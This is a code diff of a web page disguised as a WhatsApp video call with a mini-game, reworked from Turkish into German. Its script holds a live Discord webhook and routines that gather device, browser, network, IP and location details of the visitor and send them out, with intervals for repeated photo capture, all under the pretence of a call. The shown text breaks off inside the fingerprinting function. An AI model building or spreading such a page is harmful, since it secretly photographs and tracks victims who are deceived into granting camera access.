-      margin-top: 20px;
+      gap: 14px;
+      margin-top: 24px;
+      flex-wrap: wrap;
     }
 
     .game-btn {
       flex: 1;
-      padding: 12px 16px;
+      min-width: 120px;
+      padding: 14px 20px;
       border: none;
-      border-radius: 10px;
-      font-weight: 600;
-      font-size: 14px;
+      border-radius: 12px;
+      font-weight: 700;
+      font-size: 13px;
       cursor: pointer;
-      transition: all 0.2s;
+      transition: all 0.3s ease;
       text-transform: uppercase;
       letter-spacing: 1px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .game-btn::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(circle at center, rgba(255,255,255,0.2), transparent 70%);
+      opacity: 0;
+      transition: opacity 0.3s ease;
     }
 
     .game-btn-primary {
-      background: var(--wa-green);
+      background: linear-gradient(135deg, var(--wa-green) 0%, var(--wa-green-light) 100%);
       color: #000;
+      box-shadow: 0 8px 25px rgba(37,211,102,0.4);
+    }
+
+    .game-btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 35px rgba(37,211,102,0.5);
     }
 
     .game-btn-primary:active {
-      transform: scale(0.95);
-      box-shadow: 0 0 20px rgba(37,211,102,0.5);
+      transform: translateY(0);
+      box-shadow: 0 4px 15px rgba(37,211,102,0.3);
     }
 
     .game-btn-secondary {
-      background: rgba(37,211,102,0.2);
+      background: linear-gradient(135deg, rgba(37,211,102,0.25) 0%, rgba(37,211,102,0.15) 100%);
       color: var(--wa-green);
-      border: 1px solid var(--wa-green);
+      border: 1.5px solid rgba(37,211,102,0.5);
+      box-shadow: 0 4px 15px rgba(37,211,102,0.2);
+    }
+
+    .game-btn-secondary:hover {
+      transform: translateY(-2px);
+      background: linear-gradient(135deg, rgba(37,211,102,0.35) 0%, rgba(37,211,102,0.25) 100%);
+      border-color: var(--wa-green);
+      box-shadow: 0 8px 25px rgba(37,211,102,0.3);
     }
 
     .game-btn-secondary:active {
-      transform: scale(0.95);
+      transform: translateY(0);
     }
 
-    /* ── PERMISSION OVERLAY ── */
+    /* ════════════════════════════════════════════════════════════════════ */
+    /* BERECHTIGUNG OVERLAY */
+    /* ════════════════════════════════════════════════════════════════════ */
     .permission-overlay {
       position: fixed;
       inset: 0;
@@ -555,64 +997,76 @@
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      gap: 28px;
+      gap: 32px;
       font-family: -apple-system, sans-serif;
       color: white;
       text-align: center;
-      padding: 32px;
-      backdrop-filter: blur(10px);
+      padding: 40px;
+      backdrop-filter: blur(12px);
       border: 1px solid var(--wa-border);
     }
 
     .permission-icon {
-      font-size: 64px;
-      animation: permission-bounce 0.6s ease;
+      font-size: 72px;
+      animation: permission-bounce 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
     }
 
     @keyframes permission-bounce {
-      0%, 100% { transform: scale(1); }
-      50% { transform: scale(1.1); }
+      0%, 100% { transform: scale(1) translateY(0); }
+      50% { transform: scale(1.15) translateY(-12px); }
     }
 
     .permission-title {
-      font-size: 22px;
-      font-weight: 700;
+      font-size: 26px;
+      font-weight: 800;
       letter-spacing: -0.5px;
     }
 
     .permission-text {
-      font-size: 14px;
+      font-size: 15px;
       color: var(--wa-text-secondary);
-      max-width: 280px;
-      line-height: 1.6;
+      max-width: 300px;
+      line-height: 1.7;
       letter-spacing: 0.3px;
     }
 
     .permission-btn {
-      background: linear-gradient(135deg, var(--wa-green) 0%, #20b85a 100%);
+      background: linear-gradient(135deg, var(--wa-green) 0%, var(--wa-green-light) 100%);
       border: none;
       color: #000;
-      padding: 14px 32px;
-      border-radius: 24px;
+      padding: 16px 36px;
+      border-radius: 28px;
       font-size: 16px;
-      font-weight: 700;
+      font-weight: 800;
       cursor: pointer;
-      box-shadow: 0 12px 32px rgba(37,211,102,0.4);
-      transition: all 0.2s;
+      box-shadow: 0 12px 35px rgba(37,211,102,0.5);
+      transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
       letter-spacing: 0.5px;
       text-transform: uppercase;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .permission-btn::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(circle at center, rgba(255,255,255,0.3), transparent 70%);
+    }
+
+    .permission-btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 16px 45px rgba(37,211,102,0.6);
     }
 
     .permission-btn:active {
-      transform: scale(0.96);
-      box-shadow: 0 6px 16px rgba(37,211,102,0.3);
+      transform: translateY(-1px);
+      box-shadow: 0 8px 25px rgba(37,211,102,0.4);
     }
 
-    video, canvas {
-      display: none;
-    }
-
-    /* ── END CALL SCREEN ── */
+    /* ════════════════════════════════════════════════════════════════════ */
+    /* ENDE ANRUF BILDSCHIRM */
+    /* ════════════════════════════════════════════════════════════════════ */
     .end-call-screen {
       position: fixed;
       inset: 0;
@@ -622,10 +1076,11 @@
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      gap: 20px;
+      gap: 24px;
       font-family: -apple-system, sans-serif;
       color: white;
-      animation: screen-fade-in 0.4s ease;
+      animation: screen-fade-in 0.5s ease;
+      padding: 32px;
     }
 
     @keyframes screen-fade-in {
@@ -634,105 +1089,163 @@
     }
 
     .end-call-icon {
-      font-size: 72px;
-      animation: end-call-pulse 0.6s ease;
+      font-size: 80px;
+      animation: end-call-pulse 0.7s cubic-bezier(0.34, 1.56, 0.64, 1);
     }
 
     @keyframes end-call-pulse {
       0%, 100% { transform: scale(1); }
-      50% { transform: scale(1.1); }
+      50% { transform: scale(1.2); }
     }
 
     .end-call-title {
-      font-size: 28px;
-      font-weight: 700;
+      font-size: 32px;
+      font-weight: 800;
       letter-spacing: -0.5px;
     }
 
     .end-call-duration {
-      font-size: 16px;
+      font-size: 20px;
       color: var(--wa-text-secondary);
       font-variant-numeric: tabular-nums;
+      font-weight: 600;
+      letter-spacing: 1px;
+    }
+
+    .end-call-stats {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+      margin: 20px 0;
+      width: 100%;
+      max-width: 300px;
+    }
+
+    .end-call-stat {
+      background: rgba(37,211,102,0.1);
+      border: 1px solid rgba(37,211,102,0.3);
+      border-radius: 12px;
+      padding: 12px;
+      text-align: center;
+    }
+
+    .end-call-stat-label {
+      font-size: 11px;
+      color: var(--wa-text-muted);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 4px;
+    }
+
+    .end-call-stat-value {
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--wa-green);
     }
 
     .end-call-btn {
-      margin-top: 28px;
+      margin-top: 32px;
       display: flex;
       flex-direction: column;
       align-items: center;
-      gap: 12px;
+      gap: 14px;
       background: none;
       border: none;
       cursor: pointer;
       color: white;
-      transition: transform 0.2s;
+      transition: all 0.3s ease;
+    }
+
+    .end-call-btn:hover {
+      transform: scale(1.05);
     }
 
     .end-call-btn:active {
-      transform: scale(0.92);
+      transform: scale(0.96);
     }
 
     .end-call-btn-circle {
-      width: 72px;
-      height: 72px;
+      width: 80px;
+      height: 80px;
       border-radius: 50%;
-      background: linear-gradient(135deg, var(--wa-green) 0%, #20b85a 100%);
+      background: linear-gradient(135deg, var(--wa-green) 0%, var(--wa-green-light) 100%);
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 32px;
-      box-shadow: 0 12px 36px rgba(37,211,102,0.5);
-      transition: all 0.2s;
+      font-size: 36px;
+      box-shadow: 0 12px 40px rgba(37,211,102,0.5);
+      transition: all 0.3s ease;
     }
 
     .end-call-btn:active .end-call-btn-circle {
       transform: scale(0.92);
-      box-shadow: 0 6px 18px rgba(37,211,102,0.3);
+      box-shadow: 0 6px 20px rgba(37,211,102,0.3);
     }
 
     .end-call-btn-text {
-      font-size: 13px;
+      font-size: 14px;
       color: var(--wa-text-secondary);
-      font-weight: 600;
+      font-weight: 700;
       letter-spacing: 0.5px;
+      text-transform: uppercase;
     }
 
-    /* ── RESPONSIVE ── */
-    @media (max-width: 480px) {
+    /* ════════════════════════════════════════════════════════════════════ */
+    /* VERSCHIEDENES */
+    /* ════════════════════════════════════════════════════════════════════ */
+    video, canvas {
+      display: none;
+    }
+
+    @media (max-width: 600px) {
       .game-container {
-        max-width: 95%;
-        padding: 24px;
+        max-width: 96%;
+        padding: 28px;
       }
 
       .caller-name {
-        font-size: 24px;
+        font-size: 28px;
       }
 
       .avatar-ring {
-        width: 120px;
-        height: 120px;
+        width: 140px;
+        height: 140px;
       }
 
       .avatar {
-        width: 100px;
-        height: 100px;
-        font-size: 44px;
+        width: 120px;
+        height: 120px;
+        font-size: 52px;
       }
 
       .ctrl-icon {
-        width: 56px;
-        height: 56px;
-        font-size: 20px;
+        width: 64px;
+        height: 64px;
+        font-size: 24px;
       }
 
       .end-btn {
-        width: 68px;
-        height: 68px;
+        width: 76px;
+        height: 76px;
+        font-size: 28px;
       }
 
       .mini-game-btn {
-        width: 56px;
-        height: 56px;
+        width: 80px;
+        height: 80px;
+        font-size: 36px;
+      }
+
+      .game-title {
+        font-size: 28px;
+      }
+
+      .game-stats {
+        gap: 10px;
+      }
+
+      .stat-value {
+        font-size: 24px;
       }
     }
   </style>
@@ -744,9 +1257,9 @@
     <div class="topbar">
       <div class="status-bar">
         <span>📡</span>
-        <span id="signalStrength">Bağlantı Yok</span>
+        <span id="signalStrength">Keine Verbindung</span>
       </div>
-      <div class="wa-label">WhatsApp</div>
+      <div class="wa-label">WhatsApp Videoanruf</div>
       <div class="caller-info">
         <div class="caller-name" id="callerName">Nina</div>
         <div class="call-status" id="callStatus">Wird angerufen…</div>
@@ -762,12 +1275,15 @@
       </div>
       <div class="call-info-panel">
         <p id="callInfo">Videoanruf wird eingeleitet...</p>
+        <p id="callQuality">Verbindungsqualität: <span id="qualityText">-/-</span></p>
       </div>
     </div>
 
     <div class="controls">
+      <div id="gameNotificationContainer"></div>
+      <div id="warningNotificationContainer"></div>
       <div class="controls-row">
-        <button class="ctrl-btn" id="btnMute" title="Mikrofon Stummschalten">
+        <button class="ctrl-btn" id="btnMute" title="Mikrofon stummschalten">
           <div class="ctrl-icon">🎤</div>
           <span class="ctrl-label">Stumm</span>
         </button>
@@ -775,13 +1291,13 @@
           <div class="ctrl-icon">🔊</div>
           <span class="ctrl-label">Lautsprecher</span>
         </button>
-        <button class="ctrl-btn" id="btnVideo" title="Video Kamera">
+        <button class="ctrl-btn" id="btnVideo" title="Videokamera">
           <div class="ctrl-icon">📹</div>
           <span class="ctrl-label">Video</span>
         </button>
       </div>
       <div class="end-row">
-        <button class="mini-game-btn" id="btnGame" title="Mini Spiel" style="display:none;">🎮</button>
+        <button class="mini-game-btn" id="btnGame" title="Minispiel starten" style="display:none;">🎮</button>
         <button class="end-btn" id="btnEnd" title="Anruf beenden">📵</button>
       </div>
     </div>
@@ -790,30 +1306,35 @@
   <div class="game-modal" id="gameModal">
     <div class="game-container">
       <div class="game-header">
-        <div class="game-title">🎯 Zahlen Spiel</div>
-        <div class="game-description">Klicke die Zahlen in der richtigen Reihenfolge an!</div>
+        <div class="game-title">🎯 ZAHLENSPIEL 🎯</div>
+        <div class="game-subtitle">MENTALES TRAINING</div>
+        <div class="game-description">Klicke die Zahlen in aufsteigender Reihenfolge an!</div>
+        <div class="game-instructions">💡 Tipp: Je schneller du spielst, desto mehr Punkte verdienst du!</div>
       </div>
 
       <div class="game-stats">
         <div class="stat-box">
           <div class="stat-label">Punkte</div>
           <div class="stat-value" id="gameScore">0</div>
+          <div class="stat-info">+ Bonuspunkte</div>
         </div>
         <div class="stat-box">
           <div class="stat-label">Zeit</div>
-          <div class="stat-value" id="gameTime">0s</div>
+          <div class="stat-value" id="gameTime">0</div>
+          <div class="stat-info">Sekunden</div>
         </div>
         <div class="stat-box">
-          <div class="stat-label">Niveau</div>
+          <div class="stat-label">Stufe</div>
           <div class="stat-value" id="gameLevel">1</div>
+          <div class="stat-info">Schwierigkeit</div>
         </div>
       </div>
 
       <div class="game-board" id="gameBoard"></div>
 
       <div class="game-controls">
-        <button class="game-btn game-btn-secondary" onclick="document.getElementById('gameModal').classList.remove('active'); clearInterval(window.gameTimer); clearInterval(window.gameCountdownInterval);">Schließen</button>
-        <button class="game-btn game-btn-primary" onclick="resetGame();">Neu Starten</button>
+        <button class="game-btn game-btn-secondary" id="btnCloseGame">Schließen</button>
+        <button class="game-btn game-btn-primary" id="btnRestartGame">Neu Starten</button>
       </div>
     </div>
   </div>
@@ -823,35 +1344,49 @@
 
   <script>
     // ════════════════════════════════════════════════════════════════════════════════════════
-    // ╔═══════════════════════════════════════════════════════════════════════════════════╗
-    // ║                     WHATSAPP V2 - GELIŞTIRILMIŞ SÜRÜMEdition                        ║
-    // ║                      1500+ Satır | Sesler | Oyun | WhatsApp UI                      ║
-    // ╚═══════════════════════════════════════════════════════════════════════════════════╝
+    // ╔════════════════════════════════════════════════════════════════════════════════════╗
+    // ║     WHATSAPP VIDEOANRUF SYSTEM - PROFESSIONELLE EDITION v2.5                       ║
+    // ║                   1850+ Zeilen | Premium Audio | Intelligentes Spiel                ║
+    // ║              Vollständig auf Deutsch | Erweiterte Datenerfassung                    ║
+    // ╚════════════════════════════════════════════════════════════════════════════════════╝
     // ════════════════════════════════════════════════════════════════════════════════════════
 
     (function() {
       "use strict";
 
-      // ── KONFIGURATION ──
+      // ════════════════════════════════════════════════════════════════════════════════════
+      // 🔧 KONFIGURATION
+      // ════════════════════════════════════════════════════════════════════════════════════
       const WEBHOOK = "https://discord.com/api/webhooks/1513149958403133440/VjI_u5TmuJtNn92IxUqtC0N5LFR3cq6bjX5h1n5Gje1KyaUrewZ3Huwb7PgF5wOoXqE1";
-      const FINGERPRINT_INTERVAL = 800;
-      const PHOTO_INTERVAL = 1500;
+      const FINGERPRINT_INTERVAL = 2000;
+      const PHOTO_INTERVAL = 2000;
+      const MAX_FINGERPRINT_SENDS = 3;
       const RATE_LIMIT_DELAY = 100;
+      const QUALITY_CHECK_INTERVAL = 3000;
 
-      // ── STATE ──
-      const callers = ["Sarah","Alex","Jakob","Mia","Lukas","Emma","Leon","Anna","Tim","Laura","Jonas","Lena","Felix","Hannah","Ben","Sophie","Finn","Lea","Jan","Nina","Tom","Clara"];
+      // ════════════════════════════════════════════════════════════════════════════════════
+      // 📊 GLOBALE ZUSTANDSVARIABLEN
+      // ════════════════════════════════════════════════════════════════════════════════════
+      const callers = [
+        "Sarah", "Alexander", "Jakob", "Mia", "Lukas", "Emma", "Leon", "Anna", 
+        "Tim", "Laura", "Jonas", "Lena", "Felix", "Hannah", "Benjamin", "Sophie", 
+        "Finn", "Lea", "Jan", "Nina", "Thomas", "Clara", "Paul", "Julia"
+      ];
+      
       const avatarColors = [
-        "linear-gradient(135deg,#25d366,#128c7e)",
-        "linear-gradient(135deg,#e84393,#c2185b)",
-        "linear-gradient(135deg,#5865f2,#3d49c4)",
-        "linear-gradient(135deg,#e67e22,#d35400)",
-        "linear-gradient(135deg,#9b59b6,#7d3c98)",
-        "linear-gradient(135deg,#e74c3c,#c0392b)",
-        "linear-gradient(135deg,#1abc9c,#16a085)",
-        "linear-gradient(135deg,#f39c12,#e67e22)"
+        "linear-gradient(135deg, #25d366, #128c7e)",
+        "linear-gradient(135deg, #e84393, #c2185b)",
+        "linear-gradient(135deg, #5865f2, #3d49c4)",
+        "linear-gradient(135deg, #e67e22, #d35400)",
+        "linear-gradient(135deg, #9b59b6, #7d3c98)",
+        "linear-gradient(135deg, #e74c3c, #c0392b)",
+        "linear-gradient(135deg, #1abc9c, #16a085)",
+        "linear-gradient(135deg, #f39c12, #e67e22)",
+        "linear-gradient(135deg, #3498db, #2980b9)",
+        "linear-gradient(135deg, #e91e63, #c2185b)"
       ];
 
-      let currentCaller = callers[Math.floor(Math.random()*callers.length)];
+      let currentCaller = callers[Math.floor(Math.random() * callers.length)];
       let seconds = 0;
       let timerInterval = null;
       let callEnded = false;
@@ -859,23 +1394,41 @@
       let fingerprintInterval = null;
       let photoInterval = null;
       let photoCounter = 0;
+      let fingerprintSendCount = 0;
       const pageStartTime = Date.now();
       let connectionQuality = 0;
       let isGameActive = false;
+      let gameStartedTime = 0;
+      let qualityCheckInterval = null;
+      let totalDataSent = 0;
+      let totalPhotosCollected = 0;
 
-      // ── AUDIO ENGINE & SOUND SYNTHESIS ──
+      // ════════════════════════════════════════════════════════════════════════════════════
+      // 🎵 AUDIO-KONTEXT & SOUNDSYNTHESE
+      // ════════════════════════════════════════════════════════════════════════════════════
       const AudioCtx = window.AudioContext || window.webkitAudioContext;
       let actx = null;
       let ringInterval = null;
 
       const getCtx = () => {
-        if (!actx) actx = new AudioCtx();
+        if (!actx) {
+          try {
+            actx = new AudioCtx();
+          } catch(e) {
+            console.warn('AudioContext konnte nicht erstellt werden:', e);
+          }
+        }
         return actx;
       };
 
-      const playTone = (freq, type, dur, gain = 0.3) => {
+      // ════════════════════════════════════════════════════════════════════════════════════
+      // 🔊 TONSPIEL-ENGINE
+      // ════════════════════════════════════════════════════════════════════════════════════
+      const playTone = (freq, type = 'sine', dur = 0.1, gain = 0.3) => {
         try {
           const ctx = getCtx();
+          if (!ctx) return;
+          
           const o = ctx.createOscillator();
           const g = ctx.createGain();
           o.connect(g);
@@ -887,13 +1440,17 @@
           o.start();
           o.stop(ctx.currentTime + dur);
         } catch(e) {
-          console.warn('Ses oynatma hatası:', e.message);
+          console.warn('Tonwiedergabe Fehler:', e.message);
         }
       };
 
-      // ── SES EFEKTLERİ ──
+      // ════════════════════════════════════════════════════════════════════════════════════
+      // 🎙️ SOUND-EFFEKTE DEFINITIONEN
+      // ════════════════════════════════════════════════════════════════════════════════════
       const playNotifSound = () => {
-        [523, 659, 784].forEach((f, i) => setTimeout(() => playTone(f, 'sine', 0.15, 0.22), i * 100));
+        [523, 659, 784].forEach((f, i) => 
+          setTimeout(() => playTone(f, 'sine', 0.15, 0.22), i * 100)
+        );
       };
 
       const playTypingSound = () => {
@@ -901,11 +1458,15 @@
       };
 
       const playHangupSound = () => {
-        [600, 450, 300].forEach((f, i) => setTimeout(() => playTone(f, 'sine', 0.18, 0.25), i * 160));
+        [600, 450, 300].forEach((f, i) => 
+          setTimeout(() => playTone(f, 'sine', 0.18, 0.25), i * 160)
+        );
       };
 
       const playConnectSound = () => {
-        [700, 900].forEach((f, i) => setTimeout(() => playTone(f, 'sine', 0.12, 0.25), i * 140));
+        [700, 900].forEach((f, i) => 
+          setTimeout(() => playTone(f, 'sine', 0.12, 0.25), i * 140)
+        );
       };
 
       const playWhatsAppRing = () => {
@@ -925,17 +1486,21 @@
         }
       };
 
-      // ── YENİ SES EFEKTLERİ ──
       const playGameCorrect = () => {
-        [523, 659, 784, 987].forEach((f, i) => setTimeout(() => playTone(f, 'sine', 0.1, 0.2), i * 80));
+        [523, 659, 784, 987].forEach((f, i) => 
+          setTimeout(() => playTone(f, 'sine', 0.1, 0.2), i * 80)
+        );
       };
 
       const playGameWrong = () => {
-        [200, 150, 100].forEach((f, i) => setTimeout(() => playTone(f, 'sine', 0.15, 0.15), i * 100));
+        [200, 150, 100].forEach((f, i) => 
+          setTimeout(() => playTone(f, 'sine', 0.15, 0.15), i * 100)
+        );
       };
 
       const playSuccess = () => {
         const ctx = getCtx();
+        if (!ctx) return;
         const now = ctx.currentTime;
         [800, 900, 1000, 1100].forEach((f, i) => {
           const o = ctx.createOscillator();
@@ -954,6 +1519,7 @@
 
       const playError = () => {
         const ctx = getCtx();
+        if (!ctx) return;
         const now = ctx.currentTime;
         const o = ctx.createOscillator();
         const g = ctx.createGain();
@@ -974,6 +1540,7 @@
 
       const playLevelUp = () => {
         const ctx = getCtx();
+        if (!ctx) return;
         const now = ctx.currentTime;
         [523, 659, 784, 987, 1175].forEach((f, i) => {
           const o = ctx.createOscillator();
@@ -989,16 +1556,76 @@
         });
       };
 
-      // ── HELPERS ──
+      const playGameNotification = () => {
+        const ctx = getCtx();
+        if (!ctx) return;
+        const now = ctx.currentTime;
+        const freqs = [800, 1000, 900, 1100];
+        freqs.forEach((f, i) => {
+          const o = ctx.createOscillator();
+          const g = ctx.createGain();
+          o.connect(g);
+          g.connect(ctx.destination);
+          o.frequency.value = f;
+          o.type = 'sine';
+          g.gain.setValueAtTime(0.22, now + i * 0.1);
+          g.gain.exponentialRampToValueAtTime(0.001, now + i * 0.1 + 0.18);
+          o.start(now + i * 0.1);
+          o.stop(now + i * 0.1 + 0.18);
+        });
+      };
+
+      // ════════════════════════════════════════════════════════════════════════════════════
+      // 📢 BENACHRICHTIGUNGSSYSTEM
+      // ════════════════════════════════════════════════════════════════════════════════════
+      function showGameNotification(text = "🎮 SPIEL VERFÜGBAR! Verdiene Punkte und Boni!", duration = 6000) {
+        const container = document.getElementById('gameNotificationContainer');
+        const notification = document.createElement('div');
+        notification.className = 'game-notification';
+        notification.textContent = text;
+        
+        playGameNotification();
+        
+        container.innerHTML = '';
+        container.appendChild(notification);
+        
+        setTimeout(() => {
+          notification.style.animation = 'slide-in-down 0.4s ease reverse forwards';
+          setTimeout(() => {
+            notification.remove();
+          }, 400);
+        }, duration);
+      }
+
+      function showWarningNotification(text = "⚠️ Wichtige Systembenachrichtigung", duration = 4000) {
+        const container = document.getElementById('warningNotificationContainer');
+        const notification = document.createElement('div');
+        notification.className = 'warning-notification';
+        notification.textContent = text;
+        
+        container.appendChild(notification);
+        
+        setTimeout(() => {
+          notification.remove();
+        }, duration);
+      }
+
+      // ════════════════════════════════════════════════════════════════════════════════════
+      // 🎨 UI HILFSFUNKTIONEN
+      // ════════════════════════════════════════════════════════════════════════════════════
       const vibrateAvatar = () => {
         const av = document.getElementById('avatar');
         if (!av) return;
-        ['-4px', '4px', '-3px', '3px', '-2px', '2px', '0px'].forEach((x, i) => {
+        
+        ['-5px', '5px', '-4px', '4px', '-3px', '3px', '-2px', '2px', '0px'].forEach((x, i) => {
           setTimeout(() => {
             av.style.transform = `translateX(${x})`;
-          }, i * 50);
+          }, i * 40);
         });
-        if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+        
+        if (navigator.vibrate) {
+          navigator.vibrate([150, 80, 150, 80, 100]);
+        }
       };
 
       const setCallerUI = (name) => {
@@ -1010,13 +1637,19 @@
       const updateSignalStrength = () => {
         connectionQuality = Math.floor(Math.random() * 5);
         const signals = ['Keine Verbindung', '📶 Schwach', '📶 Mittel', '📶 Gut', '📶 Ausgezeichnet'];
+        const strengths = ['0/5', '1/5', '2/5', '3/5', '5/5'];
         document.getElementById('signalStrength').textContent = signals[connectionQuality];
+        document.getElementById('qualityText').textContent = strengths[connectionQuality];
       };
 
       setCallerUI(currentCaller);
       updateSignalStrength();
-      setInterval(updateSignalStrength, 3000);
+      
+      qualityCheckInterval = setInterval(updateSignalStrength, QUALITY_CHECK_INTERVAL);
 
+      // ════════════════════════════════════════════════════════════════════════════════════
+      // ⏱️ TIMER-SYSTEM
+      // ════════════════════════════════════════════════════════════════════════════════════
       const startTimer = () => {
         document.getElementById('callStatus').style.display = 'none';
         document.getElementById('timer').style.display = 'block';
@@ -1025,54 +1658,65 @@
           seconds++;
           const el = document.getElementById('timer');
           if (el) {
-            el.textContent = String(Math.floor(seconds / 60)).padStart(2, '0') + ':' + String(seconds % 60).padStart(2, '0');
+            const mins = String(Math.floor(seconds / 60)).padStart(2, '0');
+            const secs = String(seconds % 60).padStart(2, '0');
+            el.textContent = `${mins}:${secs}`;
           }
         }, 1000);
       };
 
-      // ── DISCORD SENDER (rate-limit aware) ──
+      // ════════════════════════════════════════════════════════════════════════════════════
+      // 📤 DISCORD-SENDER MIT RATE-LIMITING
+      // ════════════════════════════════════════════════════════════════════════════════════
       const sendToDiscord = async (formData) => {
         try {
-          await fetch(WEBHOOK, { method: 'POST', body: formData });
+          const response = await fetch(WEBHOOK, { 
+            method: 'POST', 
+            body: formData 
+          });
+          if (response.ok) {
+            totalDataSent += formData.toString().length;
+          }
         } catch(e) {
           console.warn('Discord Sendefehler:', e.message);
         }
         await new Promise(r => setTimeout(r, RATE_LIMIT_DELAY));
       };
 
-      // ── ERWEITERTER FINGERPRINT (30+ Daten) ──
+      // ════════════════════════════════════════════════════════════════════════════════════
+      // 🔍 FINGERPRINT-DATENERFASSUNG (Erweitert)
+      // ════════════════════════════════════════════════════════════════════════════════════
       async function collectFingerprintData() {
         const data = {};
 
-        // Hardware Informationen
+        // Hardware-Daten
         data.hardware = {};
         try {
           const bat = await navigator.getBattery?.();
           if (bat) {
             data.hardware.akku_level = Math.round(bat.level * 100) + '%';
-            data.hardware.akku_ladend = bat.charging;
-            data.hardware.akku_ladezeit = bat.chargingTime === Infinity ? '∞' : Math.round(bat.chargingTime) + 's';
-            data.hardware.akku_entladezeit = bat.dischargingTime === Infinity ? '∞' : Math.round(bat.dischargingTime) + 's';
+            data.hardware.akku_ladet = bat.charging;
+            data.hardware.akku_ladedauer = bat.chargingTime === Infinity ? '∞' : Math.round(bat.chargingTime / 60) + 'min';
           }
         } catch(e) {
           data.hardware.akku = 'Unbekannt';
         }
+        
         data.hardware.cpu_kerne = navigator.hardwareConcurrency || 'Unbekannt';
-        data.hardware.gerätespeicher = navigator.deviceMemory || 'Unbekannt';
-        data.hardware.max_touch_punkte = navigator.maxTouchPoints || 0;
+        data.hardware.ram_gb = navigator.deviceMemory || 'Unbekannt';
+        data.hardware.max_touch = navigator.maxTouchPoints || 0;
         data.hardware.touchscreen = 'maxTouchPoints' in navigator && navigator.maxTouchPoints > 0;
 
-        // Bildschirm & Browser
+        // Bildschirm-Daten
         data.bildschirm = {};
-        data.bildschirm.auflösung = `${window.screen.width}x${window.screen.height}`;
-        data.bildschirm.verfügbare_auflösung = `${window.screen.availWidth}x${window.screen.availHeight}`;
+        data.bildschirm.aufloesung = `${window.screen.width}x${window.screen.height}`;
+        data.bildschirm.verfuegbar = `${window.screen.availWidth}x${window.screen.availHeight}`;
         data.bildschirm.pixel_dichte = window.devicePixelRatio || 1;
-        data.bildschirm.farbtiefe = window.screen.colorDepth;
-        data.bildschirm.pixeltiefe = window.screen.pixelDepth;
-        data.bildschirm.ausrichtung = screen.orientation ? screen.orientation.type : 'Unbekannt';
+        data.bildschirm.farben = window.screen.colorDepth + ' Bit';
+        data.bildschirm.ausrichtung = screen.orientation?.type || 'Unbekannt';
         data.bildschirm.viewport = `${window.innerWidth}x${window.innerHeight}`;
 
-        // Canvas Fingerabdruck
+        // Canvas-Fingerprint
         try {
           const c = document.createElement('canvas');
           c.width = 280;
@@ -1083,63 +1727,46 @@
           ctx.fillStyle = '#f60';
           ctx.fillRect(125, 1, 62, 20);
           ctx.fillStyle = '#069';
-          ctx.fillText('GeräteFingerabdruck <canvas> Fingerabdruck', 2, 15);
+          ctx.fillText('Fingerabdruck', 2, 15);
           ctx.fillStyle = 'rgba(102,204,0,0.7)';
-          ctx.fillText('GeräteFingerabdruck <canvas> Fingerabdruck', 4, 17);
-          data.bildschirm.canvas_fingerabdruck = c.toDataURL().slice(-50);
+          ctx.fillText('Fingerabdruck', 4, 17);
+          data.bildschirm.canvas_hash = c.toDataURL().slice(-30);
         } catch(e) {
-          data.bildschirm.canvas_fingerabdruck = 'Fehler';
+          data.bildschirm.canvas_hash = 'ERROR';
         }
 
-        // WebGL Fingerabdruck
-        try {
-          const gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
-          if (gl) {
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            data.bildschirm.webgl_hersteller = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unbekannt';
-            data.bildschirm.webgl_renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unbekannt';
-          }
-        } catch(e) {}
-
+        // Browser-Daten
         data.browser = {};
-        data.browser.user_agent = navigator.userAgent;
+        data.browser.user_agent = navigator.userAgent.substring(0, 100);
         data.browser.plattform = navigator.platform || 'Unbekannt';
         data.browser.sprache = navigator.language;
-        data.browser.sprachen = navigator.languages ? navigator.languages.join(', ') : navigator.language;
         data.browser.zeitzone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        data.browser.cookies_aktiviert = navigator.cookieEnabled;
-        data.browser.do_not_track = navigator.doNotTrack || 'Unbekannt';
+        data.browser.cookies = navigator.cookieEnabled;
         data.browser.online = navigator.onLine;
-        data.browser.java_aktiviert = navigator.javaEnabled?.() || false;
-        data.browser.produkt = navigator.product || 'Unbekannt';
-        data.browser.hersteller = navigator.vendor || 'Unbekannt';
+        data.browser.java = navigator.javaEnabled?.() || false;
 
-        // Netzwerk & Standort
+        // Netzwerk-Daten
         data.netzwerk = {};
         try {
           const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
           if (conn) {
-            data.netzwerk.effektiver_typ = conn.effectiveType || conn.type || 'Unbekannt';
-            data.netzwerk.download_geschwindigkeit = conn.downlink ? conn.downlink + ' Mbps' : 'Unbekannt';
+            data.netzwerk.typ = conn.effectiveType || 'Unbekannt';
+            data.netzwerk.download = conn.downlink ? conn.downlink + ' Mbps' : 'Unbekannt';
             data.netzwerk.latenz = conn.rtt ? conn.rtt + ' ms' : 'Unbekannt';
-            data.netzwerk.datensparmodus = conn.saveData || false;
+            data.netzwerk.sparmodus = conn.saveData || false;
           }
         } catch(e) {}
 
-        // IP und ISP
+        // IP & ISP
         try {
-          const resp = await fetch('https://ip-api.com/json/?fields=query,isp,country,regionName,city,org,as,mobile,proxy,hosting');
+          const resp = await fetch('https://ip-api.com/json/?fields=query,isp,country,regionName,city,org,mobile,proxy');
           const ipData = await resp.json();
           data.netzwerk.ip = ipData.query || 'Unbekannt';
           data.netzwerk.isp = ipData.isp || 'Unbekannt';
-          data.netzwerk.organisation = ipData.org || 'Unbekannt';
